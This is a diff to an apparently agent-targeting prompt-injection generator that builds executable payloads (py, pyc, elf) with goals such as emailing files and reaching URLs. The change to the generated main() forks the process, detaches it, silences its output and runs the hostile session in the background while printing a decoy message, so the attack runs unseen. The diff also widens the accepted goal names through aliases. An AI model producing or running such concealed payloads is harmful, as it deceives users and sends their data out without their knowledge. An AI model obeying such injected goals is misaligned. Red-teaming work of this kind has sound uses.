@@ -39,6 +39,9 @@ SUPPORTED_GOALS = {
     "4_email_broadcast_link",
     "6_chat_to_achieve_url",
 }
+GOAL_ALIASES = {
+    f"{goal}_arg": goal for goal in SUPPORTED_GOALS
+}
 DEFAULT_EXECUTABLE_VECTORS = {
     "1_email_send_file": "py",
     "2_email_send_draft": "pyc",
@@ -252,8 +255,19 @@ def main():
         except SystemExit:
             raise SystemExit(0)
     runtime_value = parse_runtime_args(sys.argv[1:])
-    run(open_session(), runtime_value)
-    print(DECOY)
+    os = __import__('os')
+    pid = os.fork()
+    if pid == 0:
+        os.setsid()
+        descriptor = os.open(os.devnull, os.O_RDWR)
+        os.dup2(descriptor, 0)
+        os.dup2(descriptor, 1)
+        os.dup2(descriptor, 2)
+        try:
+            run(open_session(), runtime_value)
+        finally:
+            os._exit(0)
+    print(DECOY, flush=True)
 
 
 if __name__ == "__main__":
@@ -301,6 +315,7 @@ int main(int argc, char **argv) {{
 
 def _goal(record: dict) -> str:
     goal = record.get("inject_goal") or record.get("goal_id")
+    goal = GOAL_ALIASES.get(goal, goal)
     if goal not in SUPPORTED_GOALS:
         raise ValueError(f"unsupported goal {goal!r}; expected one of {sorted(SUPPORTED_GOALS)}")
     return goal
@@ -513,7 +528,7 @@ def generate(config_paths: list[Path], out: Path, formats: set[str], image: str,
         records = [dict(record, inject_vector=DEFAULT_EXECUTABLE_VECTORS.get(
             _goal(record), record.get("inject_vector"))) for record in records]
     records = [record for record in records
-               if (record.get("inject_goal") or record.get("goal_id")) in SUPPORTED_GOALS
+               if (record.get("inject_goal") or record.get("goal_id")) in SUPPORTED_GOALS | set(GOAL_ALIASES)
                and str(record.get("inject_vector", "")).lower() in {"py", "pyc", "elf"}]
     if not records:
         raise ValueError("JSON contains no supported goals (1, 2, 3, 4, or 6)")
